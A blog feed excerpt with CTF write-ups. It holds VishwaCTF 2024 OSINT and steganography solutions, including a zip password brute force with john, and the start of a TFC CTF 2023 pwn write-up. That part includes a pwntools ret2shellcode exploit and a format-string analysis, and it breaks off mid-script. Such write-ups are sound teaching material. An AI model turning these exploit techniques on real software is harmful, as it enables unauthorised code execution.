src="/imgs/post7/web/theyarecoming_flag.png" alt="theyarecoming_flag.png"></p><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="The-end-is-beginning"><a href="#The-end-is-beginning" class="headerlink" title="The end is beginning"></a>The end is beginning</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><p><img src="/imgs/post7/osint/desc.png" alt="desc.png"></p><p>searching for</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I’d be gone to my dad  </span><br><span class="line">And ask <span class="keyword">for</span> some cash  </span><br><span class="line">I ran ......</span><br></pre></td></tr></table></figure><p>shows me a rap song results, maybe its connected to lyrics of this particular song, so going through lyrics i figured out second portion of flag that is </p><p><img src="/imgs/post7/osint/lyrics.png" alt="lyrics.png"></p><p>and the first part was name of song i.e. <strong>Pradox</strong> so th flag will be</p><p><code>VishwaCTF&#123;Paradox_5000&#125;</code></p><h3 id="TRY-HACK-ME"><a href="#TRY-HACK-ME" class="headerlink" title="TRY HACK ME"></a>TRY HACK ME</h3><h4 id="Discription"><a href="#Discription" class="headerlink" title="Discription"></a>Discription</h4><p><img src="/imgs/post7/osint/thm_desc.png" alt="thm_desc.png"></p><p>as description says one of the team member, i went straight through their official <a href="https://vishwactf.com/team">page</a> where they have page for thier team members in the bottom</p><p>after checking each member profile with their username one of them have same ranking as mentioned and flag mentioned in description as well.</p><p><img src="/imgs/post7/osint/thm_profile.png" alt="thm_profile.png"></p><h3 id="ifconfig-inet"><a href="#ifconfig-inet" class="headerlink" title="ifconfig_inet"></a>ifconfig_inet</h3><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><p><img src="/imgs/post7/osint/ifconfig_desc.png" alt="ifconfig_desc.png"></p><p>hmm, sound familiar though. okay reading all description i searched for this </p><p><img src="/imgs/post7/osint/search.png" alt="search.png"></p><p>as we can see we got some reddit pages that is about some IP address( BTW this challenge is ragarding a famous television series Mr. Robot so if you have watched it, it may give you some insights)</p><p>i got this image </p><p><img src="/imgs/post7/osint/ips.png" alt="ips.png"></p><p>so maybe the highlighted one is what we searching for but still left with the <strong>.dat</strong> file that is first half our flag, searching more gives me this <a href="https://www.reddit.com/r/MrRobot/comments/km2xo0/ip_address_goof_up/">page</a></p><p>and here some people were talking about IP addresses, reading their chat i got the file name i.e. <strong>fsociety00.dat</strong></p><p><img src="/imgs/post7/osint/dat_file.gif" alt="dat_file.gif"></p><p>so flag is</p><p><code>VishwaCTF&#123;fsociety00.dat_218.108.149.373&#125;</code></p><h2 id="Post-CTF"><a href="#Post-CTF" class="headerlink" title="Post CTF"></a>Post CTF</h2><h2 id="Steg"><a href="#Steg" class="headerlink" title="Steg"></a>Steg</h2><h3 id="We-Are-Valorant"><a href="#We-Are-Valorant" class="headerlink" title="We Are Valorant"></a>We Are Valorant</h3><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><p><img src="/imgs/post7/steg/valorant_desc.png" alt="valorant_desc.png"></p><p>we have given two file i.e. <strong>we_are_valorant.adts</strong> and <strong>Astra_!!.mp4</strong>, after checking the format of <strong>.adts</strong> using <strong>file</strong> command it shows its <strong>jpg</strong> one</p><p>after changing its magic numbers to jpg it turns out as valorant theme jpg file, i tried getting some info from this file but no use and also uploaded it to the <a href="https://www.aperisolve.com/">Aperi</a> site but got nothing.</p><p>but when i changed the extension of original one i.e. <strong>we_are_valorant.adts</strong> to .jpg and uploaded it there then there were some Comman Passwords i.g. <strong>Tenz, tenz, From the shadows, Dissipate, dissipate, Kyedae, kyedae</strong></p><p>using <strong>steghide</strong> with first password that is <strong>Tenz</strong> extracts a file <strong>not_a_secret.txt</strong> that contains the flag.</p><p><code>VishwaCTF&#123;you_are_invited_to_the_biggest_valorant_event&#125;</code></p><h3 id="Mysterious-Old-Case"><a href="#Mysterious-Old-Case" class="headerlink" title="Mysterious Old Case"></a>Mysterious Old Case</h3><h4 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h4><blockquote><p>You as a FBI Agent, are working on a old case involving a ransom of $200,000. After some digging you recovered an audio recording.</p></blockquote><p>here we given <strong>final.mp3</strong> and upon checking its exif we got this</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 12.65</span><br><span class="line">File Name                       : final.mp3</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 2.6 MB</span><br><span class="line">File Modification Date/Time     : 2024:03:01 23:06:29-05:00</span><br><span class="line">File Access Date/Time           : 2024:03:03 22:21:21-05:00</span><br><span class="line">File Inode Change Date/Time     : 2024:03:01 23:08:07-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : MP3</span><br><span class="line">File Type Extension             : mp3</span><br><span class="line">MIME Type                       : audio/mpeg</span><br><span class="line">MPEG Audio Version              : 1</span><br><span class="line">Audio Layer                     : 3</span><br><span class="line">Audio Bitrate                   : 128 kbps</span><br><span class="line">Sample Rate                     : 44100</span><br><span class="line">Channel Mode                    : Stereo</span><br><span class="line">MS Stereo                       : Off</span><br><span class="line">Intensity Stereo                : Off</span><br><span class="line">Copyright Flag                  : False</span><br><span class="line">Original Media                  : False</span><br><span class="line">Emphasis                        : None</span><br><span class="line">ID3 Size                        : 320209</span><br><span class="line">Title                           : Unknown</span><br><span class="line">Artist                          : Anonymous</span><br><span class="line">Track                           : 727/305</span><br><span class="line">Album                           : Cooper</span><br><span class="line">Recording Time                  : 1971</span><br><span class="line">Genre                           : the zip file is 100 MB not 7 GB</span><br><span class="line">Original Release Time           : 0001</span><br><span class="line">Band                            : DB Cooper</span><br><span class="line">Comment                         : password <span class="keyword">for</span> the zip is all lowecase with no spaces</span><br><span class="line">User Defined URL                : https://drive.google.com/file/d/1bkuZRLKOGWB7tLNBseWL34BoyI379QbF/view?usp=drive_lin</span><br><span class="line">User Defined Text               : (purl) https://drive.google.com/file/d/1bkuZRLKOGWB7tLNBseWL34BoyI379QbF/view?usp=drive_lin</span><br><span class="line">Picture MIME Type               : image/jpeg</span><br><span class="line">Picture Type                    : Front Cover</span><br><span class="line">Picture Description             : Front Cover</span><br><span class="line">Picture                         : (Binary data 158421 bytes, use -b option to extract)</span><br><span class="line">Date/Time Original              : 1971</span><br><span class="line">Duration                        : 0:02:22 (approx)</span><br></pre></td></tr></table></figure><p>here are some exif infos that caught my attention i.e. <strong>Genre, Band, Comment</strong> and <strong>User Defined URL</strong>, in URL we have given drive file link that is log zip file named <strong>flight_logs.zip</strong> that is encrypted.</p><p>and comments says <strong>password for the zip is all lowecase with no spaces</strong> but we don’t even have password till now</p><p>and if you see <strong>Band</strong> it has value <strong>DB Cooper</strong> i searched it on google and got to know that its a person name who <strong>hijacked Northwest Orient Airlines Flight 305, a Boeing 727 aircraft, in United States airspace on November 24, 1971.</strong> </p><p>and because our file name is flight_log.zip its connecting our insights that we are in right directions</p><p>i tried some passwords from exif info but no use but i had all info about DB Cooper in wikipedia the major one is the one that i mentioned above so then i tried name of the flight that is <strong>Northwest Orient Airlines Flight</strong> as passsword <strong>northwestorientairlines</strong> and it worked indeed.</p><p>now if we look inside folder we have thousand of log file and thats intimidating but there very simple logic of mine worked, that is i sorted out all the file on the basis of their size i.e. </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">ls</span> -lSh | <span class="built_in">head</span></span><br><span class="line">total 7.4G</span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x  14M Feb 26 12:25 Flight-305.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:09 Flight-2270.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:05 Flight-448. <span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:11 Flight-4551.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:05 Flight-533. <span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:10 Flight-5358.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:11 Flight-6294.<span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:05 Flight-651. <span class="built_in">log</span></span><br><span class="line">-rwxr-xr-x 1 zr0x zr0x 9.9M Feb 26 11:11 Flight-6867.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>so if you look at the list the first one is <strong>Flight-305.log</strong> and thats the desired one</p><p>and i contains around some 30,0000 lines if you scroll it gradually you’ll gonna see the part of flag, so either we can grab it one by one or filter it using <strong>regex</strong> and <strong>tr</strong> e.g.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -v <span class="string">&#x27;^1971-11-24.*727$&#x27;</span> Flight-305.<span class="built_in">log</span> | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27; &#x27;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27; &#x27;</span></span><br><span class="line">VishwaCTF&#123;1_W!LL_3E_B@CK&#125;   </span><br></pre></td></tr></table></figure><blockquote><p>BTW we could have find the targeted log file simply by the number of filght that is mentioned in wikipedia i.e. <strong>Flight 305</strong></p></blockquote><h3 id="Secret-Code"><a href="#Secret-Code" class="headerlink" title="Secret Code"></a>Secret Code</h3><h4 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h4><blockquote><p>Akshay has a letter for you and need your help</p></blockquote><p>two files <strong>confidential.jpg</strong> and <strong>letter.txt</strong></p><p>cating letter.txt says</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">To,</span><br><span class="line">VishwaCTF<span class="string">&#x27;24 Participant</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I am Akshay, an ex employee at a Tech firm. Over all the years, I have been trading Cypto currencies and made a lot of money doing that. Now I want to withdraw my money, but I&#x27;</span>ll be charged a huge tax <span class="keyword">for</span> the transaction <span class="keyword">in</span> my country.</span><br><span class="line"></span><br><span class="line">I got to know that you are a <span class="built_in">nice</span> person and also your country doesn<span class="string">&#x27;t charge any tax so I need your help. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I want you to withdraw the money and hand over to me. But I feel some hackers are spying on my internet activity, so I am sharing this file with you. Get the password and withdraw it before the hackers have the access to my account.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your friend,</span></span><br><span class="line"><span class="string">Akshay</span></span><br></pre></td></tr></table></figure><p>no useful information here, then i started working on jpg file and if you below strings it contains some more files inside itself , you can extract it is using <strong>foremost</strong> and some time <strong>unzip</strong> works as well.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ strings -10 confidential.jpg            </span><br><span class="line"><span class="string">&#x27;9=82&lt;.342</span></span><br><span class="line"><span class="string">!22222222222222222222222222222222222222222222222222</span></span><br><span class="line"><span class="string">%&amp;&#x27;</span>()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span><br><span class="line">&amp;<span class="string">&#x27;()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz</span></span><br><span class="line"><span class="string">5ecr3t_c0de.zip</span></span><br><span class="line"><span class="string">5ecr3t_c0de.txt</span></span><br><span class="line"><span class="string">:Ca&amp;;hhyy*;</span></span><br><span class="line"><span class="string">7&lt;;P&gt;wUr;3</span></span><br><span class="line"><span class="string">:`Nw(HOR7A</span></span><br><span class="line"><span class="string">utHV&lt;=UC|Z</span></span><br><span class="line"><span class="string">helper.txtM</span></span><br><span class="line"><span class="string">5ecr3t_c0de.zip</span></span><br><span class="line"><span class="string">helper.txt            </span></span><br></pre></td></tr></table></figure><p>so here helper.txt says </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> helper.txt </span><br><span class="line">Hey buddy, I<span class="string">&#x27;m really sorry if this takes long for you to get the password. But it&#x27;</span>s a matter of <span class="variable">$10</span>,000,000 so I can<span class="string">&#x27;t risk it out.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;I really can&#x27;</span>t remember the password <span class="keyword">for</span> zip. All I can remember is it was a 6 digit number. Hope you can figure it out easily<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>now <strong>5ecr3t_c0de.zip</strong> is protected and password possiblity is any 6 digit numbers within 999999 we can brute force it using <strong>john</strong></p><p>script for generating all possible 6 digits numbers</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_combinations</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;possible_combinations.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">            combination = <span class="built_in">str</span>(i).zfill(<span class="number">6</span>) </span><br><span class="line">            file.write(combination + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_combinations()</span><br></pre></td></tr></table></figure><p>john command </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(zr0x㉿pwn3r)-[~/…/vishwaCTF-2024/steg/03_Secret_Code/tmp]</span><br><span class="line">└─$ zip2john 5ecr3t_c0de.zip &gt; secret.hash  </span><br><span class="line"></span><br><span class="line">┌──(zr0x㉿pwn3r)-[~/…/vishwaCTF-2024/steg/03_Secret_Code/tmp]</span><br><span class="line">└─$ john secret.hash --wordlist=../possible_combinations.txt</span><br></pre></td></tr></table></figure><p>after unzipping we got two files i.e. <strong>5ecr3t_c0de.txt</strong> and <strong>info.txt</strong></p><p>info.txt</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">What are these random numbers? Is it related to the given image? Maybe you should find it out by yourself</span><br></pre></td></tr></table></figure><p>5ecr3t_c0de.txt</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> 5ecr3t_c0de.txt|<span class="built_in">head</span></span><br><span class="line">(443, 1096)</span><br><span class="line">(444, 1096)</span><br><span class="line">(445, 1096)</span><br><span class="line">(3220, 1096)</span><br><span class="line">(3221, 1096)</span><br><span class="line">(38, 1097)</span><br><span class="line">(39, 1097)</span><br><span class="line">(43, 1097)</span><br><span class="line">(80, 1097)</span><br><span class="line">(81, 1097)</span><br><span class="line">............</span><br><span class="line">............</span><br></pre></td></tr></table></figure><p>so if see info and 5ecr3t_c0de we can infer that given numbers are the coordinates likely indicate positions of pixels within the image.<br>they are probably in (x, y) order, representing horizontal (x) and vertical (y) coordinates. or height and width sequentially.</p><p>so anticipation is that we have given a blank black jpg images and these are flag coordinates which will create or show flag and most probably in white </p><p>we can use this script for that </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_coordinates</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        coordinates = [<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, line.strip(<span class="string">&#x27;()\n&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>))) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line">    <span class="keyword">return</span> coordinates</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_white_pixels</span>(<span class="params">image_path, coordinates, output_path</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    <span class="keyword">for</span> coord <span class="keyword">in</span> coordinates:</span><br><span class="line">        img.putpixel(coord, (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))  <span class="comment"># RGB value for white</span></span><br><span class="line">    img.save(output_path)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Done, check : <span class="subst">&#123;output_path&#125;</span>.&quot;</span>)</span><br><span class="line"></span><br><span class="line">image_path = <span class="string">&#x27;/confidential.jpg&#x27;</span></span><br><span class="line">file_path = <span class="string">&#x27;/5ecr3t_c0de.txt&#x27;</span></span><br><span class="line">output_path = <span class="string">&#x27;output_image.png&#x27;</span></span><br><span class="line"></span><br><span class="line">coordinates = read_coordinates(file_path)</span><br><span class="line">draw_white_pixels(image_path, coordinates, output_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>and here we go</p><p><img src="/imgs/post7/steg/secret_flag.png" alt="secret_flag.png"></p><h2 id="OSINT-1"><a href="#OSINT-1" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Sagar-Sangram"><a href="#Sagar-Sangram" class="headerlink" title="Sagar Sangram"></a>Sagar Sangram</h3><p><img src="/imgs/post7/osint/sangram_desc.png" alt="sangram_desc.png"></p><p>with that sort tale description we have given descord server to join as well.</p><p>so if you are indian and know Indian mythological story then after reading this you’ll figure it aobut instantly that here its about The <strong>Samudra Manthana</strong> that is a major episode in Hinduism that is elaborated in the Vishnu Purana, a major text of Hinduism.</p><p>so when hop in the server we have given some instruction in rule section where we have to chat with a <strong>bot</strong> and answer some questions that is all regarding  <strong>Samudra Manthana</strong> and if you manage to answer those all we will be given the flag at last.</p><p><img src="/imgs/post7/osint/sagar_sangram.gif" alt="sagar_sangram.gif"></p><p>Flag :</p><p><code>VishwaCTF&#123;karmany-evadhikaras te ma phaleshu kadachana ma karma-phala-hetur bhur ma te sango stvakarmani&#125;</code></p><h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><p>yet to do …………</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> forensic </tag>
            
            <tag> web </tag>
            
            <tag> stegno </tag>
            
            <tag> osint </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF WriteUp: TFC CTF 2023</title>
      <link href="/2023/08/01/post6/tfcCTF_2023/"/>
      <url>/2023/08/01/post6/tfcCTF_2023/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/post6/TFC.jpeg" alt="front.png"></p><p>This weekend, i joined  TheFewChosen CTF 2023 where i attempted to solve pwn and few other challenges over there However, didn’t able to perform good but hmmm taught me plenty of new things and made me feel i am noob hehe just kidding i am already enough :p </p><p>some of pwn challenges i didn’t solve by myself i solved some after CTF by taking help from other participants In discord and by referring writeups i’ll gonna write those all as this blog is a medium for me to referencing the problems in future</p><p>All challenges can be found <a href="https://github.com/Durge5h/CTFs/tree/main/Competition/TFC-CTF-2023">here</a></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Diary"><a href="#Diary" class="headerlink" title="Diary"></a>Diary</h3><p>this binary contain two main functions <code>vuln</code> and <code>helper</code></p><h5 id="vuln-func"><a href="#vuln-func" class="headerlink" title="vuln func"></a>vuln func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 local_108;</span><br><span class="line">  undefined8 local_100;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Dear diary...&quot;</span>);</span><br><span class="line">  local_108 = <span class="number">0</span>;</span><br><span class="line">  local_100 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_108,<span class="number">1024</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>so here we have BOF in <code>fegets</code> function variable <em>local_108</em> being over feeded so firt thing comes into mind is that we can <em>ret2shellcode</em> if binary has NX disabled lets check  </p><p><img src="/imgs/post6/pwn/diary_ck.png" alt="diary_ck.png"></p><p>okay we do have binary with rwx so now lets craft the payload and feed the program but where to return so that we can make shellcode execute? firstly i struggled to find the solution as i forgot about <code>helper</code> function </p><h5 id="helper-func"><a href="#helper-func" class="headerlink" title="helper func"></a>helper func</h5><p><img src="/imgs/post6/pwn/diary_objdump.png" alt="diary_objdump.png"></p><p>so as you can see we do have gadget like <strong>jump rsp</strong> that can help to jump in to the stack and execute the shellcode so final payload will be like this </p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./diary&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">break *0x00000000004012aa</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line">    <span class="comment">#r = remote(&#x27;challs.tfcctf.com&#x27;,32484)</span></span><br><span class="line">    shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class="string">&#x27;amd64&#x27;</span>)   </span><br><span class="line">    <span class="comment">#print(f&quot;len of shell: &#123;len(shellcode)&#125;&quot;) </span></span><br><span class="line"></span><br><span class="line">    jmp_rsp = elf.sym.helper+<span class="number">4</span> </span><br><span class="line"></span><br><span class="line">    payload = flat (</span><br><span class="line">        asm(<span class="string">&#x27;nop&#x27;</span>)*<span class="number">264</span>,</span><br><span class="line">        jmp_rsp,</span><br><span class="line">        shellcode,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="shello-world"><a href="#shello-world" class="headerlink" title="shello-world"></a>shello-world</h3><h5 id="vuln-func-1"><a href="#vuln-func-1" class="headerlink" title="vuln func"></a>vuln func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 local_108;</span><br><span class="line">  undefined8 local_100;</span><br><span class="line">  </span><br><span class="line">  local_108 = <span class="number">0</span>;</span><br><span class="line">  local_100 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  fgets((<span class="type">char</span> *)&amp;local_108,<span class="number">0x100</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">char</span> *)&amp;local_108);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>here we have format string vulnerability in this code and as RELRO is partial we can overwrite the GOT with <code>win</code> function, lets check the offset using this script </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span 